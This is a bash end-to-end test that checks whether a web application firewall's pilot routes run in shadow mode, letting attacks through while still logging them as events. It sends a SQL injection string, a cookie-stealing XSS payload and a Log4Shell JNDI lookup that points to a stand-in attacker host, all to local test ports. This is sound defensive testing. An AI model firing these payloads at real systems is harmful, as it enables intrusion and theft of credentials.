#!/usr/bin/env bash
# W10-G2-01 on staging or prod-sim: the pilot routes are in shadow and their
# events, with an Event ID, reach ClickHouse.
#
#   1. Policies pilot-verify and pilot-upload exist in MODE_SHADOW.
#   2. Attacks on each pilot route pass (200 from the backend), including a
#      block_alone rule (Log4Shell, 700001) and SQLi/XSS: shadow never
#      blocks.
#   3. Each attack has an EVT- event, action shadow, on the route's policy,
#      found through GET /v1/events/{id} (ClickHouse).
#   4. A clean request makes no event.
#
# Usage: tests/e2e/pilot-shadow.sh [staging|prod-sim]
set -euo pipefail
here="$(cd "$(dirname "$0")" && pwd)"
root="$(cd "$here/../.." && pwd)"
case "${1:-staging}" in
    staging) d=2 state="${STAGING_STATE:-$root/deploy/staging/.state}" ;;
    prod-sim) d=3 state="$root/deploy/staging/.state-prod-sim" ;;
    *) echo "usage: pilot-shadow.sh [staging|prod-sim]" >&2; exit 2 ;;
esac
env=${1:-staging}
# shellcheck disable=SC1091
. "$state/env"
cp=http://127.0.0.1:${d}8090
fail() { echo "pilot-shadow[$env]: FAIL: $*" >&2; exit 1; }
step() { echo "pilot-shadow[$env]: $*"; }
token() {
    curl -fsS "http://127.0.0.1:${d}8180/realms/strata/protocol/openid-connect/token" \
        -d grant_type=password -d client_id=strata-lab-cli -d "client_secret=$LAB_CLI_SECRET" \
        -d username=lab-operator --data-urlencode "password=$LAB_OPERATOR_PASSWORD" |
        sed -n 's/.*"access_token":"\([^"]*\)".*/\1/p'
}
api() { curl -fsS -H "Authorization: Bearer $(token)" -H 'Content-Type: application/json' "$@"; }
json() { python3 -c "import json,sys; d=json.load(sys.stdin); print($1)"; }

for r in pilot-verify pilot-upload; do
    m=$(api "$cp/v1/policies/$r" | json "d['policy']['spec']['mode']")
    [ "$m" = MODE_SHADOW ] || fail "policy $r is $m"
done
step "1. pilot-verify and pilot-upload in MODE_SHADOW"

# route|port|curl args of one attack (each with a marker in a header the
# rules do not read, to find the event)
since=$(date -u +%FT%TZ)
attacks=(
    "pilot-verify|${d}8480|-H Content-Type:application/json --data-binary {\"document_id\":\"1'OR'1'='1\"} /v1/verify"
    "pilot-verify|${d}8480|-H Content-Type:application/json --data-binary {\"full_name\":\"<script>alert(document.cookie)</script>\"} /v1/verify"
    "pilot-upload|${d}8481|-H User-Agent:\${jndi:ldap://attacker.example.test/a} -F file=@/etc/hostname /v1/upload"
)
n=0
for a in "${attacks[@]}"; do
    IFS='|' read -r route port rest <<< "$a"
    path=${rest##* } args=${rest% *}
    # shellcheck disable=SC2086
    c=$(curl -s -o /dev/null -w '%{http_code}' -X POST -H 'Host: api.example.test' $args "http://127.0.0.1:$port$path")
    [ "$c" = 200 ] || fail "attack on $route answered $c, not 200 (shadow must not block): $args"
    n=$((n + 1))
done
step "2. $n attacks on the pilot routes passed (200), Log4Shell (block_alone) included"

start=$SECONDS
while :; do
    found=$(api -X POST "$cp/v1/events:search" -d "{\"from\":\"$since\",\"action\":\"shadow\",\"page_size\":200}" |
        python3 -c '
import json, sys
evs = [e for e in json.load(sys.stdin).get("events", []) if e["policy_id"] in ("pilot-verify", "pilot-upload")
       and e.get("client_ip", "").endswith(".1")]
print(" ".join("%s:%s" % (e["policy_id"], e["block_id"]) for e in evs))')
    [ "$(wc -w <<< "$found")" -ge "$n" ] && break
    [ $((SECONDS - start)) -lt 90 ] || fail "only these shadow events after 90 s: $found"
    sleep 3
done
for pe in $found; do
    id=${pe#*:}
    [[ "$id" == EVT-* ]] || fail "shadow event with a block id $id"
    ev=$(api "$cp/v1/events/$id")
    a=$(json "d.get('event', d)['action']" <<< "$ev")
    [ "$a" = shadow ] || fail "event $id stored as $a"
done
step "3. events in ClickHouse, action shadow, Event IDs: $found"

sleep 2
since2=$(date -u +%FT%TZ)
c=$(curl -s -o /dev/null -w '%{http_code}' -X POST -H 'Host: api.example.test' -H 'Content-Type: application/json' \
    --data-binary '{"document_id":"012345678","full_name":"Tran Thi Mai"}' "http://127.0.0.1:${d}8480/v1/verify")
[ "$c" = 200 ] || fail "clean request answered $c"
sleep 15
after=$(api -X POST "$cp/v1/events:search" -d "{\"from\":\"$since2\",\"page_size\":500}" |
    python3 -c 'import json,sys; print(sum(1 for e in json.load(sys.stdin).get("events", []) if e.get("client_ip", "").endswith(".1")))')
[ "$after" = 0 ] || fail "the clean request made $after event(s)"
step "4. a clean request: 200 and no event"
echo "pilot-shadow[$env]: PASS"
